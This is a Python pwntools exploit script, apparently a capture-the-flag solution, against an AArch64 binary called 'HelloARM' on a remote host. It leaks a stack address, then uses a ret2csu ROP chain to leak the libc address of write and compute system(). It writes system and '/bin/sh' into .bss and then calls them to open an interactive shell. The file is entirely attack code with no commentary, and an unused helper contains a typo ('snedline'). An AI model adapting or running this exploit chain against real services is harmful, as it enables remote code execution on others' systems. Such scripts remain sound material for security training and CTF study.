#coding=utf-8
from pwn import *
from LibcSearcher import *

context.binary = './HelloARM'
context.log_level = 'debug'
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./HelloARM')
if debug:
    p = remote('10.104.255.210',7777)
else:
     p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./HelloARM"])
     gdb.attach(p)

write_got = elf.got['write']
read_got = elf.got['read']
main_addr = elf.symbols['main']
bss_base = elf.bss()
log.success('write_got is ==> ' + hex(write_got))
log.success('read_got is ==> ' + hex(read_got))
log.success('main_addr is ==> ' + hex(main_addr))
log.success('bss_base is ==> ' + hex(bss_base))

def get_system(write_addr): 
    libc = ELF('./lib/libc-2.27.so')
    libc_base = write_addr - libc.sym['write']
    system_addr = libc_base + libc.sym['system']
    log.success('system_addr ==> ' + hex(system_addr))
    return system_addr

def csu(stack, target, v1, v2, v3):
    payload = 'a'*0x100 + p64(stack + 0x100)
    payload += p64(0x400AD0)
    payload += 'a'*0x110 + p64(stack) + p64(0x400AB0)  + p64(0) + p64(1)
    payload += p64(target) + p64(v1) + p64(v2) + p64(v3)
    payload += p64(stack) + p64(main_addr) 
    p.snedline(payload)
    sleep(1)
    
def exp():
   
    p.recvuntil('Hello ARM!.\n')
    p.recvuntil('number:0x')
    stack = p.recvn(12)
    stack = int(stack, 16)
    log.success('stack is ==> ' + hex(stack))
    p.recvuntil('name:')	
    p.sendline('seaver')
    p.recvuntil('message:')
#leak libc
    payload = 'a'*0x100 + p64(stack + 0x100) + p64(0x400AD0) + 'a'*0x110 + p64(stack) + p64(0x400AB0)  + p64(0)
    payload += p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)	
				#fake x29
    payload += p64(stack) + p64(main_addr) 
    p.sendline(payload)
    sleep(1)
    
    p.recvuntil('\n')
    write_addr = u64(p.recv(8).ljust(8, '\x00'))
    print 'write_addr ==> ' + hex(write_addr)
    system_addr = get_system(write_addr)

    p.recvuntil('Hello ARM!.\n')
    p.recvuntil('number:0x')
    stack = p.recvn(12)
    stack = int(stack, 16)
    p.recvuntil('name:')	
    p.sendline('seaver')
    p.recvuntil('message:')
#store system and /bin/sh
    payload = 'a'*0x100 + p64(stack + 0x100) + p64(0x400AD0) + 'a'*0x110 + p64(stack) + p64(0x400AB0)  + p64(0)
    payload += p64(1) + p64(read_got) + p64(0) + p64(bss_base) + p64(16)	
				#fake x29
    payload += p64(stack) + p64(main_addr) 
    p.sendline(payload)
    sleep(1)
    p.send(p64(system_addr) + '/bin/sh\x00')

    p.recvuntil('Hello ARM!.\n')
    p.recvuntil('number:0x')
    stack = p.recvn(12)
    stack = int(stack, 16)
    p.recvuntil('name:')	
    p.sendline('/bin/sh\n')
    p.recvuntil('message:')
#getshell
    payload = 'a'*0x100 + p64(stack + 0x100) + p64(0x400AD0) + 'a'*0x110 + p64(stack) + p64(0x400AB0)  + p64(0)
    payload += p64(1) + p64(bss_base) + p64(bss_base + 8) + p64(0) + p64(0)	
				#fake x29
    payload += p64(stack) + p64(main_addr) 
    p.sendline(payload)

    p.interactive()

exp()

